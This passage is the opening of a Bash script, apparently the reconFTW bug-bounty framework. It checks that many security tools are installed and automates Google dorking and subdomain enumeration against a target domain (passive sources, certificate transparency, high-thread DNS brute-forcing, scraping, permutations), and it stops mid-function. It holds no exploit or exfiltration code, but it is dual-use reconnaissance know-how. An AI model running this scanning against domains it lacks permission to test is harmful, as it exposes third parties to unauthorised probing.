#!/bin/bash

. ./reconftw.config

SCRIPTPATH="$( cd "$(dirname "$0")" >/dev/null 2>&1 ; pwd -P )"

banner(){
	printf "\n${bgreen}"
	printf "  ██▀███  ▓█████  ▄████▄   ▒█████   ███▄    █   █████▒▄▄▄█████▓ █     █░\n"
	printf " ▓██ ▒ ██▒▓█   ▀ ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █ ▓██   ▒ ▓  ██▒ ▓▒▓█░ █ ░█░\n"
	printf " ▓██ ░▄█ ▒▒███   ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒▒████ ░ ▒ ▓██░ ▒░▒█░ █ ░█ \n"
	printf " ▒██▀▀█▄  ▒▓█  ▄ ▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒░▓█▒  ░ ░ ▓██▓ ░ ░█░ █ ░█ \n"
	printf " ░██▓ ▒██▒░▒████▒▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░░▒█░      ▒██▒ ░ ░░██▒██▓ \n"
	printf " ░ ▒▓ ░▒▓░░░ ▒░ ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒ ░      ▒ ░░   ░ ▓░▒ ▒  \n"
	printf "   ░▒ ░ ▒░ ░ ░  ░  ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░ ░          ░      ▒ ░ ░  \n"
	printf "   ░░   ░    ░   ░        ░ ░ ░ ▒     ░   ░ ░  ░ ░      ░        ░   ░  \n"
	printf "    ░        ░  ░░ ░          ░ ░           ░                      ░    \n"
	printf "                 ░                                                      \n"
	printf "			                                     by @six2dez${reset}\n"
}

start(){

	global_start=`date +%s`

	if [ "$NOTIFICATION" = true ] ; then
		NOTIFY="notify -silent"
	else
	    NOTIFY=""
	fi

	echo "****** 🙏 Thank you for making this world safer ******" | $NOTIFY
	tools_installed

	if [ -z "$domain" ]
	then
		if [ -n "$list" ]
		then
			if [ -z "$domain" ]
			then
				domain="Multi"
				dir=$SCRIPTPATH/Recon/$domain
				called_fn_dir=$dir/.called
			fi
			if [[ "$list" = /* ]]; then
				install -D $list $dir/${domain}_probed.txt
			else
				install -D $SCRIPTPATH/$list $dir/${domain}_probed.txt
			fi
		fi
	else
		dir=$SCRIPTPATH/Recon/$domain
		called_fn_dir=$dir/.called_fn
	fi

	if [ -z "$domain" ]
	then
		printf "\n\n${bred} No domain or list provided ${reset}\n\n"
		exit
	fi

	if [ ! -d "$called_fn_dir" ]
	then
		mkdir -p $called_fn_dir
	fi

	cd $dir
	mkdir -p .tmp
	printf "\n"
	printf "${bred} Target: ${domain}\n\n"
}

function tools_installed(){

	printf "\n\n${bgreen}#######################################################################\n"
	printf "${bblue} Checking installed tools ${reset}\n\n"

	allinstalled=true

	[ -n "$GOPATH" ] || { printf "${bred} [*] GOPATH var		[NO]${reset}\n"; allinstalled=false;}
	[ -n "$GOROOT" ] || { printf "${bred} [*] GOROOT var		[NO]${reset}\n"; allinstalled=false;}
	[ -n "$PATH" ] || { printf "${bred} [*] PATH var		[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/degoogle_hunter/degoogle.py ] || { printf "${bred} [*] degoogle		[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/ParamSpider/paramspider.py ] || { printf "${bred} [*] Paramspider	[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/fav-up/favUp.py ] || { printf "${bred} [*] fav-up		[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/Corsy/corsy.py ] || { printf "${bred} [*] Corsy		[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/testssl.sh/testssl.sh ] || { printf "${bred} [*] testssl		[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/CMSeeK/cmseek.py ] || { printf "${bred} [*] CMSeeK		[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/fuzz_wordlist.txt ] || { printf "${bred} [*] OneListForAll	[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/LinkFinder/linkfinder.py ] || { printf "${bred} [*] LinkFinder	        [NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/GitDorker/GitDorker.py ] || { printf "${bred} [*] GitDorker	        [NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/webscreenshot/webscreenshot.py ] || { printf "${bred} [*] webscreenshot	[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/degoogle_hunter/degoogle_hunter.sh ] || { printf "${bred} [*] degoogle_hunter	[NO]${reset}\n"; allinstalled=false;}
	[ -f $tools/getjswords.py ] || { printf "${bred} [*] getjswords   	[NO]${reset}\n"; allinstalled=false;}
	eval type -P arjun $DEBUG_STD || { printf "${bred} [*] Arjun		[NO]${reset}\n"; allinstalled=false;}
	eval type -P github-endpoints $DEBUG_STD || { printf "${bred} [*] github-endpoints		[NO]${reset}\n"; allinstalled=false;}
	eval type -P gospider $DEBUG_STD || { printf "${bred} [*] gospider		[NO]${reset}\n"; allinstalled=false;}
	eval type -P subfinder $DEBUG_STD || { printf "${bred} [*] Subfinder		[NO]${reset}\n"; allinstalled=false;}
	eval type -P assetfinder $DEBUG_STD || { printf "${bred} [*] Assetfinder		[NO]${reset}\n"; allinstalled=false;}
	eval type -P findomain $DEBUG_STD || { printf "${bred} [*] Findomain		[NO]${reset}\n"; allinstalled=false;}
	eval type -P amass $DEBUG_STD || { printf "${bred} [*] Amass		[NO]${reset}\n"; allinstalled=false;}
	eval type -P crobat $DEBUG_STD || { printf "${bred} [*] Crobat		[NO]${reset}\n"; allinstalled=false;}
	eval type -P waybackurls $DEBUG_STD || { printf "${bred} [*] Waybackurls		[NO]${reset}\n"; allinstalled=false;}
	eval type -P gau $DEBUG_STD || { printf "${bred} [*] Gau		[NO]${reset}\n"; allinstalled=false;}
	eval type -P dnsx $DEBUG_STD || { printf "${bred} [*] dnsx		[NO]${reset}\n"; allinstalled=false;}
	eval type -P shuffledns $DEBUG_STD || { printf "${bred} [*] ShuffleDns		[NO]${reset}\n"; allinstalled=false;}
	eval type -P cf-check $DEBUG_STD || { printf "${bred} [*] Cf-check		[NO]${reset}\n"; allinstalled=false;}
	eval type -P nuclei $DEBUG_STD || { printf "${bred} [*] Nuclei		[NO]${reset}\n"; allinstalled=false;}
	[ -d ~/nuclei-templates ] || { printf "${bred} [*] Nuclei templates    [NO]${reset}\n"; allinstalled=false;}
	eval type -P gf $DEBUG_STD || { printf "${bred} [*] Gf		[NO]${reset}\n"; allinstalled=false;}
	eval type -P Gxss $DEBUG_STD || { printf "${bred} [*] Gxss		[NO]${reset}\n"; allinstalled=false;}
	eval type -P subjs $DEBUG_STD || { printf "${bred} [*] subjs		[NO]${reset}\n"; allinstalled=false;}
	eval type -P ffuf $DEBUG_STD || { printf "${bred} [*] ffuf		[NO]${reset}\n"; allinstalled=false;}
	eval type -P massdns $DEBUG_STD || { printf "${bred} [*] Massdns		[NO]${reset}\n"; allinstalled=false;}
	eval type -P qsreplace $DEBUG_STD || { printf "${bred} [*] qsreplace		[NO]${reset}\n"; allinstalled=false;}
	eval type -P interlace $DEBUG_STD || { printf "${bred} [*] interlace		[NO]${reset}\n"; allinstalled=false;}
	eval type -P hakrawler $DEBUG_STD || { printf "${bred} [*] hakrawler		[NO]${reset}\n"; allinstalled=false;}
	eval type -P dnsgen $DEBUG_STD || { printf "${bred} [*] DnsGen		[NO]${reset}\n"; allinstalled=false;}
	eval type -P anew $DEBUG_STD || { printf "${bred} [*] Anew		[NO]${reset}\n"; allinstalled=false;}
	eval type -P unfurl $DEBUG_STD || { printf "${bred} [*] unfurl		[NO]${reset}\n"; allinstalled=false;}
	eval type -P crlfuzz $DEBUG_STD || { printf "${bred} [*] crlfuzz		[NO]${reset}\n"; allinstalled=false;}
	eval type -P httpx $DEBUG_STD || { printf "${bred} [*] Httpx		[NO]${reset}\n${reset}"; allinstalled=false;}
	eval type -P jq $DEBUG_STD || { printf "${bred} [*] jq			[NO]${reset}\n${reset}"; allinstalled=false;}
	eval type -P notify $DEBUG_STD || { printf "${bred} [*] notify		[NO]${reset}\n${reset}"; allinstalled=false;}

	if [ "${allinstalled}" = true ] ; then
		printf "${bgreen} Good! All installed! ${reset}\n\n"
	else
		printf "\n${yellow} Try running the installer script again ./install.sh"
		printf "\n${yellow} If it fails for any reason try to install manually the tools missed"
		printf "\n${yellow} Finally remember to set the ${bred}\$tools${yellow} variable at the start of this script"
		printf "\n${yellow} If nothing works and the world is gonna end you can always ping me :D ${reset}\n\n"
	fi

	printf "${bblue} Tools check finished\n"
	printf "${bgreen}#######################################################################\n"
}

function tools_full(){

	printf "\n\n${bgreen}#######################################################################\n"
	printf "${bblue} Checking installed tools ${reset}\n\n"
	[ -n "$GOPATH" ] && printf "${bgreen}[*] GOPATH var		[YES]${reset}\n" || { printf "${bred} [*] GOPATH var		[NO]${reset}\n"; }
	[ -n "$GOROOT" ] && printf "${bgreen}[*] GOROOT var		[YES]${reset}\n" || { printf "${bred} [*] GOROOT var		[NO]${reset}\n"; }
	[ -n "$PATH" ] && printf "${bgreen}[*] PATH var		[YES]${reset}\n" || { printf "${bred} [*] PATH var		[NO]${reset}\n"; }
	[ -f $tools/degoogle_hunter/degoogle.py ] && printf "${bgreen}[*] degoogle		[YES]${reset}\n" || printf "${bred} [*] degoogle		[NO]${reset}\n"
	[ -f $tools/ParamSpider/paramspider.py ] && printf "${bgreen}[*] Paramspider		[YES]${reset}\n" || printf "${bred} [*] Paramspider	[NO]${reset}\n"
	[ -f $tools/fav-up/favUp.py ] && printf "${bgreen}[*] fav-up		[YES]${reset}\n" || printf "${bred} [*] fav-up		[NO]${reset}\n"
	[ -f $tools/Corsy/corsy.py ] && printf "${bgreen}[*] Corsy		[YES]${reset}\n" || printf "${bred} [*] Corsy		[NO]${reset}\n"
	[ -f $tools/testssl.sh/testssl.sh ] && printf "${bgreen}[*] testssl		[YES]${reset}\n" || printf "${bred} [*] testssl		[NO]${reset}\n"
	[ -f $tools/CMSeeK/cmseek.py ] && printf "${bgreen}[*] CMSeeK		[YES]${reset}\n" || printf "${bred} [*] CMSeeK		[NO]${reset}\n"
	[ -f $tools/fuzz_wordlist.txt ] && printf "${bgreen}[*] OneListForAll	[YES]${reset}\n" || printf "${bred} [*] OneListForAll	[NO]${reset}\n"
	[ -f $tools/LinkFinder/linkfinder.py ] && printf "${bgreen}[*] LinkFinder	        [YES]${reset}\n" || printf "${bred} [*] LinkFinder	        [NO]${reset}\n"
	[ -f $tools/degoogle_hunter/degoogle_hunter.sh ] && printf "${bgreen}[*] degoogle_hunter	[YES]${reset}\n" || printf "${bred} [*] degoogle_hunter	[NO]${reset}\n"
	[ -f $tools/GitDorker/GitDorker.py ] && printf "${bgreen}[*] GitDorker		[YES]${reset}\n" || printf "${bred} [*] GitDorker		[NO]${reset}\n"
	[ -f $tools/webscreenshot/webscreenshot.py ] && printf "${bgreen}[*] webscreenshot	[YES]${reset}\n" || printf "${bred} [*] webscreenshot	[NO]${reset}\n"
	[ -f $tools/getjswords.py ] && printf "${bgreen}[*] getjswords.py	[YES]${reset}\n" || printf "${bred} [*] getjswords.py	[NO]${reset}\n"
	eval type -P arjun $DEBUG_STD && printf "${bgreen}[*] Arjun		[YES]${reset}\n" || { printf "${bred} [*] Arjun		[NO]${reset}\n"; }
	eval type -P github-endpoints $DEBUG_STD && printf "${bgreen}[*] github-endpoints	[YES]${reset}\n" || { printf "${bred} [*] github-endpoints	[NO]${reset}\n"; }
	eval type -P gospider $DEBUG_STD && printf "${bgreen}[*] gospider		[YES]${reset}\n" || { printf "${bred} [*] gospider		[NO]${reset}\n"; }
	eval type -P subfinder $DEBUG_STD && printf "${bgreen}[*] Subfinder		[YES]${reset}\n" || { printf "${bred} [*] Subfinder		[NO]${reset}\n"; }
	eval type -P assetfinder $DEBUG_STD && printf "${bgreen}[*] Assetfinder		[YES]${reset}\n" || { printf "${bred} [*] Assetfinder	[NO]${reset}\n"; }
	eval type -P findomain $DEBUG_STD && printf "${bgreen}[*] Findomain		[YES]${reset}\n" || { printf "${bred} [*] Findomain		[NO]${reset}\n"; }
	eval type -P amass $DEBUG_STD && printf "${bgreen}[*] Amass		[YES]${reset}\n" || { printf "${bred} [*] Amass		[NO]${reset}\n"; }
	eval type -P crobat $DEBUG_STD && printf "${bgreen}[*] Crobat		[YES]${reset}\n" || { printf "${bred} [*] Crobat		[NO]${reset}\n"; }
	eval type -P waybackurls $DEBUG_STD && printf "${bgreen}[*] Waybackurls		[YES]${reset}\n" || { printf "${bred} [*] Waybackurls	[NO]${reset}\n"; }
	eval type -P gau $DEBUG_STD && printf "${bgreen}[*] Gau		        [YES]${reset}\n" || { printf "${bred} [*] Gau		[NO]${reset}\n"; }
	eval type -P dnsx $DEBUG_STD && printf "${bgreen}[*] dnsx		[YES]${reset}\n" || { printf "${bred} [*] dnsx		[NO]${reset}\n"; }
	eval type -P shuffledns $DEBUG_STD && printf "${bgreen}[*] ShuffleDns		[YES]${reset}\n" || { printf "${bred} [*] ShuffleDns		[NO]${reset}\n"; }
	eval type -P cf-check $DEBUG_STD && printf "${bgreen}[*] Cf-check		[YES]${reset}\n" || { printf "${bred} [*] Cf-check		[NO]${reset}\n"; }
	eval type -P nuclei $DEBUG_STD && printf "${bgreen}[*] Nuclei		[YES]${reset}\n" || { printf "${bred} [*] Nuclei		[NO]${reset}\n"; }
	[ -d ~/nuclei-templates ] && printf "${bgreen}[*] Nuclei templates  	[YES]${reset}\n" || printf "${bred} [*] Nuclei templates  	[NO]${reset}\n"
	eval type -P gf $DEBUG_STD && printf "${bgreen}[*] Gf		        [YES]${reset}\n" || { printf "${bred} [*] Gf			[NO]${reset}\n"; }
	eval type -P Gxss $DEBUG_STD && printf "${bgreen}[*] Gxss		[YES]${reset}\n" || { printf "${bred} [*] Gxss		[NO]${reset}\n"; }
	eval type -P subjs $DEBUG_STD && printf "${bgreen}[*] subjs		[YES]${reset}\n" || { printf "${bred} [*] subjs		[NO]${reset}\n"; }
	eval type -P ffuf $DEBUG_STD && printf "${bgreen}[*] ffuf		[YES]${reset}\n" || { printf "${bred} [*] ffuf		[NO]${reset}\n"; }
	eval type -P massdns $DEBUG_STD && printf "${bgreen}[*] Massdns		[YES]${reset}\n" || { printf "${bred} [*] Massdns		[NO]${reset}\n"; }
	eval type -P qsreplace $DEBUG_STD && printf "${bgreen}[*] qsreplace		[YES]${reset}\n" || { printf "${bred} [*] qsreplace		[NO]${reset}\n"; }
	eval type -P interlace $DEBUG_STD && printf "${bgreen}[*] interlace		[YES]${reset}\n" || { printf "${bred} [*] interlace		[NO]${reset}\n"; }
	eval type -P hakrawler $DEBUG_STD && printf "${bgreen}[*] hakrawler		[YES]${reset}\n" || { printf "${bred} [*] hakrawler		[NO]${reset}\n"; }
	eval type -P dnsgen $DEBUG_STD && printf "${bgreen}[*] DnsGen		[YES]${reset}\n" || { printf "${bred} [*] DnsGen		[NO]${reset}\n"; }
	eval type -P anew $DEBUG_STD && printf "${bgreen}[*] Anew		[YES]${reset}\n" || { printf "${bred} [*] Anew		[NO]${reset}\n"; }
	eval type -P unfurl $DEBUG_STD && printf "${bgreen}[*] unfurl		[YES]${reset}\n" || { printf "${bred} [*] unfurl		[NO]${reset}\n"; }
	eval type -P crlfuzz $DEBUG_STD && printf "${bgreen}[*] crlfuzz		[YES]${reset}\n" || { printf "${bred} [*] crlfuzz		[NO]${reset}\n"; }
	eval type -P httpx $DEBUG_STD && printf "${bgreen}[*] Httpx		[YES]${reset}\n${reset}" || { printf "${bred} [*] Httpx		[NO]${reset}\n${reset}"; }
	eval type -P jq $DEBUG_STD && printf "${bgreen}[*] jq			[YES]${reset}\n${reset}" || { printf "${bred} [*] jq			[NO]${reset}\n${reset}"; }
	eval type -P notify $DEBUG_STD && printf "${bgreen}[*] notify		[YES]${reset}\n${reset}" || { printf "${bred} [*] notify		[NO]${reset}\n${reset}"; }

	printf "\n${yellow} If any tool is not installed under $tools, I trust in your ability to install it :D\n Also remember to set the ${bred}\$tools${yellow} variable at the start of this script.\n If you have any problem you can always ping me ;) ${reset}\n\n"
	printf "${bblue} Tools check finished\n"
	printf "${bgreen}#######################################################################\n"
}

dorks(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] && [ "$DORKS" = true ]
	then
		start=`date +%s`
		printf "${bgreen}#######################################################################\n"
		printf "${bblue} Performing Google Dorks ${reset}\n\n" | $NOTIFY
		$tools/degoogle_hunter/degoogle_hunter.sh $domain | tee ${domain}_dorks.txt
		sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" ${domain}_dorks.txt && touch $called_fn_dir/.${FUNCNAME[0]}
		end=`date +%s`
		getElapsedTime $start $end
		printf "$\n${bblue} Finished dorks in ${runtime} Happy hunting! ${reset}\n" | $NOTIFY
		printf "${bgreen}#######################################################################\n"
	else
		printf "${yellow} ${FUNCNAME[0]} are already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

subdomains_full(){
	NUMOFLINES_subs="0"
	NUMOFLINES_probed="0"
	printf "${bgreen}#######################################################################\n\n"
	printf "${bblue} Running : Subdomain Enumeration\n\n" | $NOTIFY
	if [ -f "${domain}_subdomains.txt" ]
	then
		eval cp ${domain}_subdomains.txt .tmp/${domain}_subdomains_old.txt $DEBUG_ERROR
	fi
	if [ -f "${domain}_probed.txt" ]
	then
		eval cp ${domain}_probed.txt .tmp/${domain}_probed_old.txt $DEBUG_ERROR
	fi
	sub_passive
	sub_crt
	sub_brute
	sub_dns
	sub_scraping
	sub_permut
	webprobe_simple
	if [ -f "${domain}_subdomains.txt" ]
		then
			deleteOutScoped $outOfScope_file ${domain}_subdomains.txt
			NUMOFLINES_subs=$(eval cat ${domain}_subdomains.txt $DEBUG_ERROR | anew .tmp/${domain}_subdomains_old.txt | wc -l)
	fi
	if [ -f "${domain}_probed.txt" ]
		then
			deleteOutScoped $outOfScope_file ${domain}_probed.txt
			NUMOFLINES_probed=$(eval cat ${domain}_probed.txt $DEBUG_ERROR | anew .tmp/${domain}_probed_old.txt | wc -l)
	fi
	printf "${bblue}\n Total subdomains: ${reset}\n\n" | $NOTIFY
	text="${bred}\n - ${NUMOFLINES_subs} new alive subdomains${reset}\n\n"
	printf "${text}" && printf "${text}" | $NOTIFY
	eval cat ${domain}_subdomains.txt $DEBUG_ERROR | sort
	text="${bred}\n - ${NUMOFLINES_probed} new web probed${reset}\n\n"
	printf "${text}" && printf "${text}" | $NOTIFY
	eval cat ${domain}_probed.txt $DEBUG_ERROR | sort
	text="${bblue}\n Subdomain Enumeration Finished\n"
	printf "${text}" && printf "${text}" | $NOTIFY
	printf "${bblue} Results are saved in ${domain}_subdomains.txt and ${domain}_probed.txt${reset}\n"
	printf "${bgreen}#######################################################################\n\n"
}

sub_passive(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Passive Subdomain Enumeration${reset}\n" | $NOTIFY
			eval subfinder -d $domain -o .tmp/subfinder.txt $DEBUG_STD
			eval assetfinder --subs-only $domain $DEBUG_ERROR | anew -q .tmp/assetfinder.txt
			eval amass enum -passive -d $domain -config $AMASS_CONFIG -o .tmp/amass.txt $DEBUG_STD
			eval findomain --quiet -t $domain -u .tmp/findomain.txt $DEBUG_STD
			eval crobat -s $domain $DEBUG_ERROR | anew -q .tmp/crobat.txt
			timeout 5m waybackurls $domain | unfurl --unique domains | anew -q .tmp/waybackurls.txt
			NUMOFLINES=$(eval cat .tmp/subfinder.txt .tmp/assetfinder.txt .tmp/amass.txt .tmp/findomain.txt .tmp/crobat.txt .tmp/waybackurls.txt $DEBUG_ERROR | sed "s/*.//" | anew .tmp/passive_subs.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new subdomains by passive found in ${runtime}${reset}\n\n" | $NOTIFY
			fi
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

sub_crt(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SUBCRT" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Crtsh Subdomain Enumeration${reset}\n" | $NOTIFY
			cd $tools/crtfinder
			eval python3 crtfinder.py -u $domain $DEBUG_STD
			outputfile=${domain%%.*}
			if [ "$FULLSCOPE" = true ] ; then
				eval cat ${outputfile}.txt $DEBUG_ERROR | anew -q $dir/.tmp/crtsh_subs_tmp.txt
			else
				eval cat ${outputfile}.txt $DEBUG_ERROR | grep ".$domain$" | anew -q $dir/.tmp/crtsh_subs_tmp.txt
			fi
			if [ "$DEEP" = true ] ; then
				eval python3 dig.py ${outputfile}.txt > ${domain}_more.txt $DEBUG_STD
				if [ "$FULLSCOPE" = true ] ; then
					eval cat ${domain}_more.txt $DEBUG_ERROR | anew -q $dir/.tmp/crtsh_subs_tmp.txt
				else
					eval cat ${domain}_more.txt $DEBUG_ERROR | grep ".$domain$" | anew -q $dir/.tmp/crtsh_subs_tmp.txt
				fi
				eval rm ${domain}_more.txt $DEBUG_ERROR
			fi
			eval rm ${outputfile}.txt $DEBUG_ERROR
			cd $dir
			if [ "$FULLSCOPE" = true ] ; then
				eval curl "https://tls.bufferover.run/dns?q=.${domain}" $DEBUG_ERROR | eval jq -r .Results[] $DEBUG_ERROR | cut -d ',' -f3 | anew -q .tmp/crtsh_subs_tmp.txt
				eval curl "https://dns.bufferover.run/dns?q=.${domain}" $DEBUG_ERROR | eval jq -r '.FDNS_A'[],'.RDNS'[] $DEBUG_ERROR | cut -d ',' -f2 | anew -q .tmp/crtsh_subs_tmp.txt
			else
				eval curl "https://tls.bufferover.run/dns?q=.${domain}" $DEBUG_ERROR | eval jq -r .Results[] $DEBUG_ERROR | cut -d ',' -f3 | grep -F ".$domain" | anew -q .tmp/crtsh_subs.txt
				eval curl "https://dns.bufferover.run/dns?q=.${domain}" $DEBUG_ERROR | eval jq -r '.FDNS_A'[],'.RDNS'[] $DEBUG_ERROR | cut -d ',' -f2 | grep -F ".$domain" | anew -q .tmp/crtsh_subs_tmp.txt
			fi
			touch $called_fn_dir/.${FUNCNAME[0]}
			NUMOFLINES=$(eval cat .tmp/crtsh_subs_tmp.txt $DEBUG_ERROR | anew .tmp/crtsh_subs.txt | wc -l)
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new subdomains by certificate transparency found in ${runtime}${reset}\n\n" | $NOTIFY
			fi
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

sub_brute(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SUBBRUTE" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Bruteforce Subdomain Enumeration${reset}\n" | $NOTIFY
			eval shuffledns -d $domain -w $subs_wordlist -r $resolvers -t 5000 -o .tmp/active_tmp.txt $DEBUG_STD
			NUMOFLINES=$(eval cat .tmp/active_tmp.txt $DEBUG_ERROR | sed "s/*.//" | anew .tmp/brute_subs.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new subdomains by bruteforce found in ${runtime}${reset}\n\n" | $NOTIFY
			fi
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

sub_dns(){
	if [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Active Subdomain Enumeration${reset}\n" | $NOTIFY
			cat .tmp/*_subs.txt | anew -q .tmp/subs_no_resolved.txt
			deleteOutScoped $outOfScope_file .tmp/subs_no_resolved.txt
			eval shuffledns -d $domain -list .tmp/subs_no_resolved.txt -r $resolvers -t 5000 -o .tmp/${domain}_subdomains_tmp.txt $DEBUG_STD
			echo $domain | dnsx -silent | anew -q .tmp/${domain}_subdomains_tmp.txt
			dnsx -retry 3 -silent -cname -resp-only -l .tmp/${domain}_subdomains_tmp.txt | grep ".$domain$" | anew -q .tmp/${domain}_subdomains_tmp.txt
			eval dnsx -retry 3 -silent -cname -resp -l ${domain}_subdomains.txt -o ${domain}_subdomains_cname.txt $DEBUG_STD
			NUMOFLINES=$(cat .tmp/${domain}_subdomains_tmp.txt | anew ${domain}_subdomains.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new subdomains by dns resolution found in ${runtime}${reset}\n\n" | $NOTIFY
			fi
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

sub_scraping(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SUBSCRAPING" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Source code scraping subdomain search${reset}\n" | $NOTIFY
			touch .tmp/scrap_subs.txt
			cat ${domain}_subdomains.txt | httpx -follow-host-redirects -H "${HEADER}" -status-code -timeout 15 -silent -no-color | cut -d ' ' -f1 | grep ".$domain$" | anew -q .tmp/${domain}_probed_tmp.txt
			cat .tmp/${domain}_probed_tmp.txt | hakrawler -subs -plain -linkfinder -insecure | anew -q .tmp/scrap_subs.txt
			cat .tmp/scrap_subs.txt | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/scrap_subs_resolved.txt $DEBUG_STD
			NUMOFLINES=$(eval cat .tmp/scrap_subs_resolved.txt $DEBUG_ERROR | anew ${domain}_subdomains.txt | wc -l)
			touch $called_fn_dir/.${FUNCNAME[0]}
			end=`date +%s`
			getElapsedTime $start $end
			if [ "$NUMOFLINES" -gt 0 ]; then
				printf "${green} ${NUMOFLINES} new subdomains by scraping found in ${runtime}${reset}\n\n" | $NOTIFY
			fi
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n" | $NOTIFY
	fi
}

sub_permut(){
	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SUBPERMUTE" = true ]
		then
			start=`date +%s`
			printf "${yellow} Running : Permutations Subdomain Enumeration${reset}\n" | $NOTIFY
			if [[ $(cat .tmp/subs_no_resolved.txt | wc -l) -le 50 ]]
				then
					eval dnsgen .tmp/subs_no_resolved.txt --wordlist $tools/permutations_list.txt $DEBUG_ERROR | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/permute1_tmp.txt $DEBUG_STD
					eval cat .tmp/permute1_tmp.txt $DEBUG_ERROR | anew -q .tmp/permute1.txt
					eval dnsgen .tmp/permute1.txt --wordlist $tools/permutations_list.txt $DEBUG_ERROR | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/permute2_tmp.txt $DEBUG_STD
					eval cat .tmp/permute2_tmp.txt $DEBUG_ERROR | anew -q .tmp/permute2.txt
					eval cat .tmp/permute1.txt .tmp/permute2.txt $DEBUG_ERROR | anew -q .tmp/permute_subs.txt
				elif [[ $(cat .tmp/subs_no_resolved.txt | wc -l) -le 100 ]]
		  		then
					eval dnsgen .tmp/subs_no_resolved.txt --wordlist $tools/permutations_list.txt $DEBUG_ERROR | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/permute_tmp.txt $DEBUG_STD
					eval cat .tmp/permute_tmp.txt $DEBUG_ERROR | anew -q .tmp/permute_subs.txt
				else
					if [[ $(cat ${domain}_subdomains.txt | wc -l) -le 50 ]]
						then
							eval dnsgen ${domain}_subdomains.txt --wordlist $tools/permutations_list.txt $DEBUG_ERROR | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/permute1_tmp.txt $DEBUG_STD
							eval cat .tmp/permute1_tmp.txt $DEBUG_ERROR | anew -q .tmp/permute1.txt
							eval dnsgen .tmp/permute1.txt --wordlist $tools/permutations_list.txt $DEBUG_ERROR | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/permute2_tmp.txt $DEBUG_STD
							eval cat .tmp/permute2_tmp.txt $DEBUG_ERROR | anew -q .tmp/permute2.txt
							eval cat .tmp/permute1.txt .tmp/permute2.txt $DEBUG_ERROR | anew -q .tmp/permute_subs.txt
						elif [[ $(cat ${domain}_subdomains.txt | wc -l) -le 100 ]]
						then
							eval dnsgen ${domain}_subdomains.txt --wordlist $tools/permutations_list.txt $DEBUG_ERROR | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/permute_tmp.txt $DEBUG_STD
							eval cat .tmp/permute_tmp.txt $DEBUG_ERROR | anew -q .tmp/permute_subs.txt
						else
							printf "\n${bred} Skipping Permutations: Too Much Subdomains${reset}\n\n" | $NOTIFY
					fi
			fi
			if [ -f ".tmp/permute_subs.txt" ]
			then
				deleteOutScoped $outOfScope_file .tmp/permute_subs.txt
